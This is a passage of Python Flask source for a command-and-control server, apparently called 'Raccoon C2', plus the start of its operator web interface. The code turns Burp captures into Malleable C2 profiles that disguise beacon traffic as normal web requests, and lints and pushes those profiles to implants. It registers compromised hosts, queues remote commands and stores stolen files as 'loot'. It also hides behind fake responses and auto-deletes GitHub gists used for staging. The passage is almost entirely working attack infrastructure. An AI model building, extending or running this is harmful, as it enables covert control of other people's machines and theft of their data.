            r = subprocess.run(
                ["gh", "gist", "delete", gist_id, "--yes"],
                capture_output=True, text=True, timeout=15,
            )
            _pending_gists.pop(gist_id, None)
            if r.returncode != 0:
                return jsonify({"error": r.stderr.strip()}), 500
            _log_event("BEACON-GIST", f"Manually deleted gist {gist_id}")
            return jsonify({"status": "deleted", "gist_id": gist_id})
        except FileNotFoundError:
            return jsonify({"error": "gh CLI not found"}), 400

    @app.route("/api/server/beacon-gist/check", methods=["GET"])
    @require_auth
    def api_gist_check():
        try:
            r = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
            return jsonify({"available": r.returncode == 0, "detail": r.stderr.strip() or r.stdout.strip()})
        except FileNotFoundError:
            return jsonify({"available": False, "detail": "gh CLI not installed"})

    # ── Burp Request to Malleable C2 Profile ──

    @app.route("/api/server/c2-profile/from-burp", methods=["POST"])
    @require_auth
    def api_burp_to_profile():
        body = request.get_json(silent=True) or {}
        raw_req = body.get("request", "").replace("\r\n", "\n").replace('"', "'")
        raw_res = body.get("response", "").replace("\r\n", "\n").replace('"', "'")
        if not raw_req.strip():
            return jsonify({"error": "Request is empty"}), 400

        meta_loc = body.get("metadata_location", "header")
        meta_name = body.get("metadata_name", "Cookie")
        meta_enc = body.get("metadata_encoding", "base64url")
        id_loc = body.get("id_location", "parameter")
        id_name = body.get("id_name", "sid")
        id_enc = body.get("id_encoding", "base64url")
        output_enc = body.get("output_encoding", "base64url")

        def _parse_http(raw):
            lines_list = raw.split("\n")
            first = lines_list[0] if lines_list else ""
            hdrs = {}
            body_text = ""
            in_body = False
            for ln in lines_list[1:]:
                if in_body:
                    body_text += ln + "\n"
                elif ln.strip() == "":
                    in_body = True
                else:
                    if ":" in ln:
                        k, v = ln.split(":", 1)
                        hdrs[k.strip()] = v.strip()
            return first, hdrs, body_text.rstrip("\n")

        req_line, req_hdrs, req_body = _parse_http(raw_req)
        res_line, res_hdrs, res_body = _parse_http(raw_res)

        parts = req_line.split()
        method = parts[0] if parts else "GET"
        full_uri = parts[1] if len(parts) > 1 else "/"
        uri_path = full_uri.split("?")[0]
        params = {}
        if "?" in full_uri:
            for p in full_uri.split("?", 1)[1].split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v

        skip_hdrs = {"Host", "Content-Length", "Connection", "Accept-Encoding"}

        def _indent(text, n=4):
            pad = " " * n
            return "\n".join(pad + l for l in text.split("\n"))

        def _make_transform(loc, name, encoding, prepend="", append_str=""):
            block = "            mask;\n"
            block += f"            {encoding};\n"
            if prepend:
                block += f'            prepend "{prepend}";\n'
            if append_str:
                block += f'            append "{append_str}";\n'
            if loc == "header":
                block += f'            header "{name}";\n'
            elif loc == "parameter":
                block += f'            parameter "{name}";\n'
            elif loc == "uri-append":
                block += "            uri-append;\n"
            else:
                block += "            print;\n"
            return block

        profile = "# Generated from Burp request by TrashPandaPaws\n"
        profile += "# Review and adjust before use\n\n"

        client_hdrs = ""
        for h, v in req_hdrs.items():
            if h in skip_hdrs:
                continue
            client_hdrs += f'        header "{h}" "{v}";\n'
        client_params = ""
        for pn, pv in params.items():
            client_params += f'        parameter "{pn}" "{pv}";\n'

        res_hdrs_str = ""
        for h, v in res_hdrs.items():
            if h in skip_hdrs or h.startswith(":"):
                continue
            res_hdrs_str += f'        header "{h}" "{v}";\n'

        meta_prepend = ""
        if meta_loc == "header" and meta_name == "Cookie" and "Cookie" in req_hdrs:
            cookie_val = req_hdrs["Cookie"]
            if "=" in cookie_val:
                last_semi = cookie_val.rfind(";")
                if last_semi >= 0:
                    meta_prepend = cookie_val[:last_semi + 1] + " "

        profile += f'http-get {{\n'
        profile += f'    set uri "{uri_path}";\n'
        profile += f'    set verb "{method}";\n\n'
        profile += f'    client {{\n'
        profile += client_hdrs
        profile += client_params
        profile += f'        metadata {{\n'
        profile += _make_transform(meta_loc, meta_name, meta_enc, meta_prepend)
        profile += f'        }}\n'
        profile += f'    }}\n\n'
        profile += f'    server {{\n'
        profile += res_hdrs_str
        profile += f'        output {{\n'
        profile += f'            mask;\n'
        profile += f'            base64url;\n'

        if res_body:
            half = len(res_body) // 2
            h1 = res_body[:half].replace('"', "'")[:80]
            h2 = res_body[half:].replace('"', "'")[:80]
            if h1:
                profile += f'            prepend "{h1}";\n'
            if h2:
                profile += f'            append "{h2}";\n'
        profile += f'            print;\n'
        profile += f'        }}\n'
        profile += f'    }}\n'
        profile += f'}}\n\n'

        post_uri = uri_path.upper() if uri_path != "/" else "//"
        profile += f'http-post {{\n'
        profile += f'    set uri "{post_uri}";\n'
        profile += f'    set verb "{method}";\n\n'
        profile += f'    client {{\n'
        profile += client_hdrs
        profile += client_params
        profile += f'        id {{\n'
        profile += _make_transform(id_loc, id_name, id_enc)
        profile += f'        }}\n\n'
        profile += f'        output {{\n'
        profile += f'            mask;\n'
        profile += f'            {output_enc};\n'

        if req_body:
            half = len(req_body) // 2
            h1 = req_body[:half].replace('"', "'")[:80]
            h2 = req_body[half:].replace('"', "'")[:80]
            if h1:
                profile += f'            prepend "{h1}";\n'
            if h2:
                profile += f'            append "{h2}";\n'
        profile += f'            print;\n'
        profile += f'        }}\n'
        profile += f'    }}\n\n'
        profile += f'    server {{\n'
        profile += res_hdrs_str
        profile += f'        output {{\n'
        profile += f'            mask;\n'
        profile += f'            base64url;\n'
        profile += f'            print;\n'
        profile += f'        }}\n'
        profile += f'    }}\n'
        profile += f'}}\n'

        return jsonify({
            "profile": profile,
            "method": method,
            "uri": uri_path,
            "headers_count": len(req_hdrs),
            "params_count": len(params),
        })

    # ── Malleable C2 Profile Linter ──

    @app.route("/api/server/c2-profile/lint", methods=["POST"])
    @require_auth
    def api_c2_profile_lint():
        body = request.get_json(silent=True) or {}
        source = body.get("source", "")
        if not source.strip():
            return jsonify({"errors": [], "warnings": [], "info": []})

        VALID_BLOCKS = {
            "http-get", "http-post", "http-stager", "https-certificate",
            "http-config", "stage", "process-inject", "post-ex",
        }
        VALID_SUB_BLOCKS = {
            "client", "server", "metadata", "id", "output",
            "transform-x86", "transform-x64", "execute",
        }
        GLOBAL_OPTIONS = {
            "sample_name", "sleeptime", "jitter", "data_jitter", "useragent",
            "maxdns", "dns_idle", "dns_max_txt", "dns_sleep",
            "dns_stager_prepend", "dns_stager_subhost", "dns_ttl",
            "host_stage", "pipename", "pipename_stager",
            "smb_frame_header", "tcp_port", "tcp_frame_header",
            "ssh_banner", "ssh_pipename", "spawnto", "headers_remove",
        }
        CERT_OPTIONS = {
            "C", "CN", "O", "OU", "L", "ST", "validity", "keystore", "password",
        }
        STAGE_OPTIONS = {
            "allocator", "checksum", "cleanup", "compile_time", "entry_point",
            "image_size_x86", "image_size_x64", "magic_mz_x86", "magic_mz_x64",
            "magic_pe", "module_x86", "module_x64", "name", "obfuscate",
            "rich_header", "sleep_mask", "smartinject", "stomppe", "userwx",
        }
        POSTEX_OPTIONS = {
            "spawnto_x86", "spawnto_x64", "obfuscate", "smartinject",
            "amsi_disable", "pipename", "keylogger", "threadhint",
        }
        INJECT_OPTIONS = {
            "allocator", "min_alloc", "startrwx", "userwx",
        }
        HTTP_OPTIONS = {"uri", "verb"}
        STAGER_OPTIONS = {"uri_x86", "uri_x64"}
        CONFIG_OPTIONS = {"headers", "trust_x_forwarded_for", "block_useragents"}
        TRANSFORMS = {"base64", "base64url", "mask", "netbios", "netbiosu"}
        TERMINATORS = {"print", "uri-append"}

        errors = []
        warnings = []
        info = []
        lines = source.split("\n")

        brace_stack = []
        block_context = []
        has_http_get = False
        has_http_post = False
        in_transform_block = False
        transform_has_terminator = False
        transform_block_name = ""
        transform_start_line = 0

        for i, raw_line in enumerate(lines, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            code = line.split("#")[0].strip() if "#" in line and '"' not in line.split("#")[0].count('"') % 2 == 0 else line
            code_noc = ""
            in_str = False
            for ci, ch in enumerate(code):
                if ch == '"' and (ci == 0 or code[ci-1] != '\\'):
                    in_str = not in_str
                elif ch == '#' and not in_str:
                    code_noc = code[:ci].strip()
                    break
            if not code_noc:
                code_noc = code.strip()
            if not code_noc:
                continue

            if "'" in code_noc:
                in_s = False
                for ci, ch in enumerate(code_noc):
                    if ch == '"' and (ci == 0 or code_noc[ci-1] != '\\'):
                        in_s = not in_s
                    elif ch == "'" and not in_s:
                        errors.append({"line": i, "severity": "error",
                            "msg": "Use double quotes (\") instead of single quotes (')"})
                        break

            if '{' in code_noc:
                parts = code_noc.replace('{', ' { ').split()
                idx = parts.index('{') if '{' in parts else -1
                if idx >= 0:
                    block_name = parts[0] if idx > 0 else ""
                    if block_name == "set":
                        pass
                    elif block_name in VALID_BLOCKS:
                        if block_name == "http-get":
                            has_http_get = True
                        elif block_name == "http-post":
                            has_http_post = True
                        block_context.append(block_name)
                        brace_stack.append(i)
                    elif block_name in VALID_SUB_BLOCKS:
                        if block_name in ("metadata", "id", "output"):
                            in_transform_block = True
                            transform_has_terminator = False
                            transform_block_name = block_name
                            transform_start_line = i
                        block_context.append(block_name)
                        brace_stack.append(i)
                    elif block_name and block_name not in VALID_BLOCKS | VALID_SUB_BLOCKS:
                        errors.append({"line": i, "severity": "error",
                            "msg": f"Unknown block type: '{block_name}'"})
                        block_context.append(block_name)
                        brace_stack.append(i)
                    else:
                        block_context.append("?")
                        brace_stack.append(i)

            if '}' in code_noc:
                if brace_stack:
                    brace_stack.pop()
                    if in_transform_block and block_context and block_context[-1] == transform_block_name:
                        if not transform_has_terminator:
                            errors.append({"line": i, "severity": "error",
                                "msg": f"Transform block '{transform_block_name}' (line {transform_start_line}) must end with a termination statement (print, header, parameter, or uri-append)"})
                        in_transform_block = False
                    if block_context:
                        block_context.pop()
                else:
                    errors.append({"line": i, "severity": "error",
                        "msg": "Unexpected closing brace '}'"})

            if in_transform_block:
                tokens = code_noc.replace(";", " ").split()
                if tokens:
                    t = tokens[0]
                    if t in TERMINATORS or (t in ("header", "parameter") and len(tokens) >= 2 and '"' not in tokens[-1] if len(tokens) == 2 else True):
                        transform_has_terminator = True
                    if t == "print":
                        transform_has_terminator = True

            if code_noc.startswith("set "):
                tokens = code_noc.split(None, 2)
                if len(tokens) >= 2:
                    opt = tokens[1]
                    if not code_noc.rstrip().endswith(";"):
                        errors.append({"line": i, "severity": "error",
                            "msg": f"Missing semicolon after 'set {opt}' statement"})
                    if len(tokens) >= 3:
                        val = tokens[2].rstrip(";").strip()
                        if val and not val.startswith('"'):
                            warnings.append({"line": i, "severity": "warning",
                                "msg": f"Value for '{opt}' should be double-quoted"})

            elif code_noc.startswith("header ") or code_noc.startswith("parameter "):
                if not code_noc.rstrip().endswith(";"):
                    errors.append({"line": i, "severity": "error",
                        "msg": "Missing semicolon after header/parameter statement"})

            elif code_noc.startswith("prepend ") or code_noc.startswith("append "):
                if not code_noc.rstrip().endswith(";"):
                    errors.append({"line": i, "severity": "error",
                        "msg": "Missing semicolon after prepend/append statement"})

            for kw in ("base64;", "base64url;", "mask;", "netbios;", "netbiosu;", "print;", "uri-append;"):
                if kw in code_noc:
                    break

        if brace_stack:
            for ln in brace_stack:
                errors.append({"line": ln, "severity": "error",
                    "msg": "Unclosed brace '{' — missing matching '}'"})

        if not has_http_get and not has_http_post:
            warnings.append({"line": 1, "severity": "warning",
                "msg": "Profile has no http-get or http-post blocks"})

        found_sleeptime = any("sleeptime" in l for l in lines)
        found_jitter = any(l.strip().startswith("set jitter") or l.strip().startswith('set jitter') for l in lines)
        found_ua = any("useragent" in l for l in lines)

        if not found_sleeptime:
            info.append({"line": 1, "severity": "info",
                "msg": "No sleeptime set — defaults to 60000ms"})
        if not found_jitter:
            info.append({"line": 1, "severity": "info",
                "msg": "No jitter set — defaults to 0%"})
        if not found_ua:
            info.append({"line": 1, "severity": "info",
                "msg": "No custom User-Agent — will use default"})

        return jsonify({
            "errors": errors,
            "warnings": warnings,
            "info": info,
            "line_count": len(lines),
        })

    # ── Malleable C2 Profile Parser & Storage ──

    def _parse_c2_profile(source: str) -> dict:
        """Parse a Malleable C2 profile into an actionable config dict."""
        profile: dict = {"globals": {}, "http_get": {}, "http_post": {}, "https_cert": {}}
        lines = source.split("\n")
        i = 0

        def skip_ws():
            nonlocal i
            while i < len(lines) and not lines[i].strip():
                i += 1

        def parse_block():
            nonlocal i
            result: dict = {"headers": [], "params": []}
            while i < len(lines):
                line = lines[i].strip()
                if line.startswith("#") or not line:
                    i += 1
                    continue
                if line == "}":
                    i += 1
                    return result
                if line.startswith("set "):
                    m = re.match(r'set\s+(\S+)\s+"([^"]*)"\s*;', line)
                    if m:
                        result[m.group(1)] = m.group(2)
                    i += 1
                elif line.startswith("header "):
                    m = re.match(r'header\s+"([^"]*)"\s+"([^"]*)"\s*;', line)
                    if m:
                        result["headers"].append({"name": m.group(1), "value": m.group(2)})
                    i += 1
                elif line.startswith("parameter "):
                    m = re.match(r'parameter\s+"([^"]*)"\s+"([^"]*)"\s*;', line)
                    if m:
                        result["params"].append({"name": m.group(1), "value": m.group(2)})
                    elif re.match(r'parameter\s+"([^"]*)"\s*;', line):
                        pm = re.match(r'parameter\s+"([^"]*)"\s*;', line)
                        result.setdefault("terminator", {})["type"] = "parameter"
                        result["terminator"]["name"] = pm.group(1)
                    i += 1
                elif any(line.startswith(b + " {") or line.startswith(b + "{")
                         for b in ("client", "server", "metadata", "id", "output")):
                    bname = line.split("{")[0].strip().split()[0]
                    i += 1
                    result[bname] = parse_block()
                elif any(line.rstrip(";").strip() in t
                         for t in (("base64", "base64url", "mask", "netbios", "netbiosu"),)):
                    result.setdefault("transforms", []).append(line.rstrip("; "))
                    i += 1
                elif line.startswith("prepend "):
                    m = re.match(r'prepend\s+"([^"]*)"\s*;', line)
                    if m:
                        result["prepend"] = m.group(1)
                    i += 1
                elif line.startswith("append "):
                    m = re.match(r'append\s+"([^"]*)"\s*;', line)
                    if m:
                        result["append"] = m.group(1)
                    i += 1
                elif line.rstrip(";").strip() == "print":
                    result.setdefault("terminator", {})["type"] = "print"
                    i += 1
                elif line.startswith("uri-append"):
                    result.setdefault("terminator", {})["type"] = "uri-append"
                    i += 1
                else:
                    i += 1
            return result

        while i < len(lines):
            line = lines[i].strip()
            if line.startswith("#") or not line:
                i += 1
                continue
            if line.startswith("set "):
                m = re.match(r'set\s+(\S+)\s+"([^"]*)"\s*;', line)
                if m:
                    profile["globals"][m.group(1)] = m.group(2)
                i += 1
            elif line.startswith("http-get") and "{" in line:
                i += 1
                profile["http_get"] = parse_block()
            elif line.startswith("http-post") and "{" in line:
                i += 1
                profile["http_post"] = parse_block()
            elif line.startswith("https-certificate") and "{" in line:
                i += 1
                profile["https_cert"] = parse_block()
            else:
                i += 1

        config = {}

        if profile["globals"].get("useragent"):
            config["useragent"] = profile["globals"]["useragent"]
        if profile["globals"].get("sleeptime"):
            config["sleeptime"] = int(profile["globals"]["sleeptime"])
        if profile["globals"].get("jitter"):
            config["jitter"] = int(profile["globals"]["jitter"])

        for block_name in ("http_get", "http_post"):
            block = profile[block_name]
            if not block:
                continue
            bc: dict = {}
            uris = block.get("uri", "")
            if uris:
                bc["uris"] = [u.strip() for u in uris.split() if u.strip()]

            client = block.get("client", {})
            if client.get("headers"):
                bc["headers"] = {h["name"]: h["value"] for h in client["headers"]}

            if client.get("params"):
                bc["params"] = {p["name"]: p["value"] for p in client["params"]}

            for sub in ("metadata", "id", "output"):
                sub_block = client.get(sub, block.get(sub, {}))
                if sub_block and isinstance(sub_block, dict):
                    sub_cfg: dict = {}
                    if sub_block.get("transforms"):
                        sub_cfg["transforms"] = sub_block["transforms"]
                    if sub_block.get("prepend"):
                        sub_cfg["prepend"] = sub_block["prepend"]
                    if sub_block.get("append"):
                        sub_cfg["append"] = sub_block["append"]
                    if sub_block.get("terminator"):
                        sub_cfg["terminator"] = sub_block["terminator"]
                    if sub_block.get("headers"):
                        sub_cfg["header"] = sub_block["headers"][0]["name"]
                    if sub_cfg:
                        bc[sub] = sub_cfg

            server = block.get("server", {})
            if server.get("headers"):
                bc["server_headers"] = {h["name"]: h["value"] for h in server["headers"]}

            server_output = server.get("output", {})
            if server_output and isinstance(server_output, dict):
                so: dict = {}
                if server_output.get("transforms"):
                    so["transforms"] = server_output["transforms"]
                if server_output.get("prepend"):
                    so["prepend"] = server_output["prepend"]
                if server_output.get("append"):
                    so["append"] = server_output["append"]
                if so:
                    bc["server_output"] = so

            config[block_name] = bc

        return config

    @app.route("/api/server/c2-profile/save", methods=["POST"])
    @require_auth
    def api_c2_profile_save():
        global _active_c2_profile, _active_c2_profile_source
        body = request.get_json(silent=True) or {}
        source = body.get("source", "").strip()
        if not source:
            return jsonify({"error": "No profile source provided"}), 400
        try:
            config = _parse_c2_profile(source)
        except Exception as e:
            return jsonify({"error": f"Parse error: {e}"}), 400
        _active_c2_profile = config
        _active_c2_profile_source = source
        _log_event("C2-PROFILE", "Saved active C2 profile")
        return jsonify({"ok": True, "config": config})

    @app.route("/api/server/c2-profile/active", methods=["GET"])
    @require_auth
    def api_c2_profile_active():
        return jsonify({
            "active": bool(_active_c2_profile),
            "config": _active_c2_profile,
            "source": _active_c2_profile_source,
        })

    @app.route("/api/server/c2-profile/push", methods=["POST"])
    @require_auth
    def api_c2_profile_push():
        body = request.get_json(silent=True) or {}
        agent_ids = body.get("agent_ids", [])
        if not _active_c2_profile:
            return jsonify({"error": "No active profile — save one first"}), 400
        if not agent_ids:
            agent_ids = list(agents.keys())
        pushed = []
        for aid in agent_ids:
            if aid not in agents:
                continue
            task = {
                "id": str(uuid.uuid4())[:8],
                "cmd": "reconfig",
                "args": "",
                "data": json.dumps({"c2_profile": _active_c2_profile}),
                "timeout": 60,
                "queued": _now(),
                "status": "pending",
            }
            task_queues.setdefault(aid, []).append(task)
            history.setdefault(aid, []).append({
                "task_id": task["id"],
                "cmd": "reconfig",
                "args": "c2_profile",
                "timestamp": task["queued"],
                "status": "pending",
                "output": None,
            })
            pushed.append(aid)
        _log_event("C2-PROFILE", f"Pushed profile to {len(pushed)} agent(s)")
        return jsonify({"ok": True, "pushed": pushed, "count": len(pushed)})

    # ── Beacon catch-all (handles any POST path) ──

    @app.route("/", methods=["POST"])
    @app.route("/<path:path>", methods=["POST"])
    def beacon_handler(path=""):
        try:
            body = request.get_json(silent=True)
            if not body:
                return _fake_response()

            payload = crypto.unwrap(body)
            if payload is None:
                return _fake_response()

            action = payload.get("action", "")
            agent_id = payload.get("agent_id", "")

            req_meta = {
                "path": request.path,
                "user_agent": request.headers.get("User-Agent", ""),
                "headers": {k: v for k, v in request.headers
                            if k.lower() not in ("host", "content-length",
                                                  "connection")},
                "ts": _now(),
            }
            if agent_id and agent_id in agents:
                agents[agent_id]["_last_request"] = req_meta

            if action == "register":
                return _handle_register(payload, crypto)
            elif action == "beacon":
                return _handle_beacon(payload, crypto)
            elif action == "result":
                return _handle_result(payload, crypto, data_dir)
            else:
                return _fake_response()

        except Exception as e:
            logger.debug("Beacon handler error: %s", e)
            return _fake_response()

    return app


def _fake_response():
    return jsonify({"status": "ok", "version": "2.1.0"}), 200


def _handle_register(payload: dict, crypto: ServerCrypto):
    implant_id = payload.get("id", "")

    for aid, info in agents.items():
        if info.get("id") == implant_id:
            info.update({
                "hostname": payload.get("hostname", ""),
                "os": payload.get("os", ""),
                "arch": payload.get("arch", ""),
                "user": payload.get("user", ""),
                "pid": payload.get("pid", 0),
                "interval": payload.get("interval", 300),
                "local_ips": payload.get("local_ips", []),
                "last_seen": _now(),
                "_last_seen_ts": time.time(),
            })
            resp = crypto.wrap({"success": True, "agent_id": aid})
            _cleanup_pending_gists()
            logger.info("Agent re-registered: %s (%s)", aid, payload.get("hostname"))
            _log_event("RECONNECT", f"{payload.get('user', '?')}@{payload.get('hostname', '?')} "
                       f"pid={payload.get('pid')} os={payload.get('os', '?')}",
                       agent_id=aid)
            return jsonify(resp)

    agent_id = _assign_name()
    agents[agent_id] = {
        "id": implant_id,
        "agent_id": agent_id,
        "hostname": payload.get("hostname", ""),
        "os": payload.get("os", ""),
        "arch": payload.get("arch", ""),
        "user": payload.get("user", ""),
        "pid": payload.get("pid", 0),
        "interval": payload.get("interval", 300),
        "local_ips": payload.get("local_ips", []),
        "proxy_mode": payload.get("proxy_mode", ""),
        "proxy_active": payload.get("proxy_active", ""),
        "uptime": payload.get("uptime", 0),
        "registered": _now(),
        "last_seen": _now(),
        "_last_seen_ts": time.time(),
    }
    task_queues[agent_id] = []
    history[agent_id] = []

    logger.info("New agent registered: %s (%s @ %s)",
                agent_id, payload.get("user"), payload.get("hostname"))
    _log_event("REGISTER", f"New agent {payload.get('user', '?')}@{payload.get('hostname', '?')} "
               f"os={payload.get('os', '?')} arch={payload.get('arch', '?')} pid={payload.get('pid')}",
               agent_id=agent_id)

    resp = crypto.wrap({"success": True, "agent_id": agent_id})
    _cleanup_pending_gists()
    return jsonify(resp)


def _cleanup_pending_gists():
    if not _pending_gists:
        return
    for gist_id in list(_pending_gists.keys()):
        t = threading.Thread(target=_do_delete_gist, args=(gist_id,), daemon=True)
        t.start()


def _do_delete_gist(gist_id):
    try:
        r = subprocess.run(
            ["gh", "gist", "delete", gist_id, "--yes"],
            capture_output=True, text=True, timeout=15,
        )
        if r.returncode == 0:
            _log_event("BEACON-GIST", f"Auto-deleted gist {gist_id} (agent connected)")
        else:
            _log_event("BEACON-GIST", f"Failed to auto-delete gist {gist_id}: {r.stderr.strip()}")
    except Exception as e:
        _log_event("BEACON-GIST", f"Auto-delete error for {gist_id}: {e}")
    _pending_gists.pop(gist_id, None)


def _handle_beacon(payload: dict, crypto: ServerCrypto):
    agent_id = payload.get("agent_id")
    if not agent_id:
        for aid, info in agents.items():
            if info.get("id") == payload.get("id"):
                agent_id = aid
                break

    if agent_id and agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()
        agents[agent_id]["uptime"] = payload.get("uptime", 0)
        agents[agent_id]["interval"] = payload.get("interval",
                                                    agents[agent_id].get("interval", 300))
        if payload.get("local_ips"):
            agents[agent_id]["local_ips"] = payload["local_ips"]
        if payload.get("proxy_mode"):
            agents[agent_id]["proxy_mode"] = payload["proxy_mode"]
        if payload.get("proxy_active"):
            agents[agent_id]["proxy_active"] = payload["proxy_active"]
        if payload.get("c2_profile") is not None:
            agents[agent_id]["c2_profile"] = payload["c2_profile"]

        queue = task_queues.get(agent_id, [])
        if queue:
            task = queue.pop(0)
            task["status"] = "dispatched"
            task["dispatched"] = _now()
            logger.info("Dispatching task %s (%s) to %s",
                        task["id"], task["cmd"], agent_id)
            _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
                       f"task_id={task['id']}", agent_id=agent_id)
            resp = crypto.wrap(task)
            return jsonify(resp)

    return jsonify(crypto.wrap({}))


def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
    task_id = payload.get("task_id", "")
    agent_id = payload.get("agent_id", "")
    status = payload.get("status", "unknown")
    output = payload.get("output", "")
    data = payload.get("data")

    results[task_id] = {
        "task_id": task_id,
        "agent_id": agent_id,
        "status": status,
        "output": output,
        "data": data,
        "received": _now(),
    }

    if agent_id in history:
        for entry in history[agent_id]:
            if entry.get("task_id") == task_id:
                entry["status"] = status
                entry["output"] = output
                break

    if agent_id in agents:
        agents[agent_id]["last_seen"] = _now()
        agents[agent_id]["_last_seen_ts"] = time.time()

    logger.info("Result from %s task %s: %s (%d bytes)",
                agent_id, task_id, status, len(output))

    cmd_name = ""
    if agent_id in history:
        for entry in history[agent_id]:
            if entry.get("task_id") == task_id:
                cmd_name = entry.get("cmd", "")
                break
    _log_event("RESULT", f"cmd={cmd_name} task_id={task_id} status={status} "
               f"output_len={len(output)}", agent_id=agent_id)

    _save_state(data_dir)

    if data and data.get("data"):
        is_loot = data.get("loot", False)
        sub = "loot" if is_loot else "downloads"
        dl_dir = data_dir / sub / agent_id
        dl_dir.mkdir(parents=True, exist_ok=True)
        filename = data.get("filename", f"{task_id}.bin")
        ts = time.strftime("%Y%m%d-%H%M%S")
        safe_name = f"{ts}_{filename}"
        (dl_dir / safe_name).write_bytes(base64.b64decode(data["data"]))
        logger.info("%s saved: %s/%s", sub.title(), agent_id, safe_name)
        category = "LOOT" if is_loot else "DOWNLOAD"
        _log_event(category, f"file={safe_name} saved to {dl_dir / safe_name}",
                   agent_id=agent_id)

    return jsonify(crypto.wrap({"ack": True}))


# ── Operator HTML (embedded) ──

_OPERATOR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Raccoon C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#070910;--surface:rgba(10,14,22,0.94);--surface2:rgba(15,20,30,0.88);
  --red:#ff1a1a;--red-dim:#991111;--red-glow:rgba(255,26,26,0.4);
  --green:#33ff33;--green-dim:#1a8c1a;--yellow:#ffcc00;--orange:#ff6600;
  --text:#d0d4dc;--text2:#6b7080;--border:rgba(255,26,26,0.15);
  --mono:'Cascadia Code','Fira Code','JetBrains Mono','Courier New',monospace;
  --sans:system-ui,-apple-system,sans-serif;
}
html,body{height:100%;overflow:hidden;font-family:var(--sans);color:var(--text);background:var(--bg)}
body{
  background-image:url('/static/wallpaper.jpg');
  background-size:cover;background-position:center;background-attachment:fixed;
}
body::after{
  content:'';position:fixed;inset:0;
  background:linear-gradient(180deg,rgba(7,9,16,0.35) 0%,rgba(7,9,16,0.55) 100%);
  pointer-events:none;z-index:0;
}
#app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh}

/* Header */
header{
  display:flex;align-items:center;gap:14px;padding:10px 20px;
  background:var(--surface);border-bottom:1px solid var(--border);
  box-shadow:0 2px 20px rgba(255,26,26,0.08);
}
header img{width:38px;height:38px;border-radius:50%;border:2px solid var(--red-dim)}
header h1{font-size:18px;font-weight:700;color:var(--red);text-shadow:0 0 15px var(--red-glow);letter-spacing:0.04em}
header .subtitle{font-size:11px;color:var(--text2);margin-left:4px}
header .spacer{flex:1}
header .status-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
header .info{font-size:11px;color:var(--text2)}

/* Layout */
.main{display:flex;flex:1;overflow:hidden}

/* Sidebar */
.sidebar{
  width:260px;min-width:200px;background:var(--surface);
  border-right:1px solid var(--border);display:flex;flex-direction:column;
}
.sidebar h2{
  font-size:11px;text-transform:uppercase;letter-spacing:0.08em;
  color:var(--text2);padding:14px 16px 8px;
}
.agent-list{flex:1;overflow-y:auto;padding:0 8px 8px}
.agent-card{
  padding:10px 12px;margin-bottom:4px;border-radius:6px;cursor:pointer;
  border:1px solid transparent;transition:all 0.15s;
}
.agent-card:hover{background:var(--surface2);border-color:var(--border)}
.agent-card.active{background:rgba(255,26,26,0.08);border-color:var(--red-dim)}
.agent-card .name{font-size:13px;font-weight:600;color:var(--text)}
.agent-card .meta{font-size:11px;color:var(--text2);margin-top:2px}
.agent-card .dot{
  display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px;vertical-align:middle;
}
.dot.online{background:var(--green);box-shadow:0 0 4px var(--green)}
.dot.stale{background:var(--yellow);box-shadow:0 0 4px var(--yellow)}
.dot.offline{background:#555}

/* Content */
.content{flex:1;display:flex;flex-direction:column;overflow:hidden}
.agent-header{
  padding:12px 20px;background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:16px;
}
.agent-header .agent-name{font-size:15px;font-weight:700;color:var(--red)}
.agent-header .tag{
  font-size:10px;padding:2px 8px;border-radius:3px;
  background:rgba(255,26,26,0.1);color:var(--red);border:1px solid var(--red-dim);
}
.agent-header .detail{font-size:12px;color:var(--text2)}

/* Terminal */
.terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:8px 12px}
.terminal-split{flex:1;display:flex;overflow:hidden;gap:0}
.terminal-left{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:200px}
.terminal{
  flex:1;overflow-y:auto;padding:12px 16px;
  background:rgba(0,0,0,0.6);border-radius:8px;border:1px solid var(--border);
  font-family:var(--mono);font-size:13px;line-height:1.6;
}
.terminal::-webkit-scrollbar{width:6px}
.terminal::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:3px}
.t-system{color:var(--text2);font-style:italic}
.t-cmd{color:var(--red)}
.t-cmd::before{content:'❯ ';color:var(--red-dim)}
.t-output{color:var(--green);white-space:pre-wrap;word-break:break-all}
.t-error{color:#ff6666;white-space:pre-wrap}
.t-info{color:var(--yellow)}
.t-pending{color:var(--text2);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}

/* Resizer */
.resizer{
  width:6px;cursor:col-resize;background:transparent;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
  transition:background 0.15s;
}
.resizer:hover,.resizer.active{background:var(--red-dim)}
.resizer::after{
  content:'';width:2px;height:40px;border-radius:1px;
  background:var(--border);transition:background 0.15s;
}
.resizer:hover::after,.resizer.active::after{background:var(--red)}

/* Side panel */
.side-panel{
  width:420px;min-width:200px;max-width:70%;
  display:none;flex-direction:column;overflow:hidden;min-height:0;
}
.side-panel.open{display:flex}
.side-panel-header{
  display:flex;align-items:center;padding:8px 12px;gap:8px;
  background:rgba(0,0,0,0.4);border-bottom:1px solid var(--border);
  border-radius:8px 8px 0 0;
}
.side-panel-header .title{
  font-size:12px;font-weight:600;color:var(--red);text-transform:uppercase;
  letter-spacing:0.06em;flex:1;
}
.side-panel-header button{
  background:none;border:none;color:var(--text2);cursor:pointer;
  font-size:16px;padding:2px 6px;border-radius:3px;
}
.side-panel-header button:hover{color:var(--red);background:rgba(255,26,26,0.1)}
.side-panel-body{
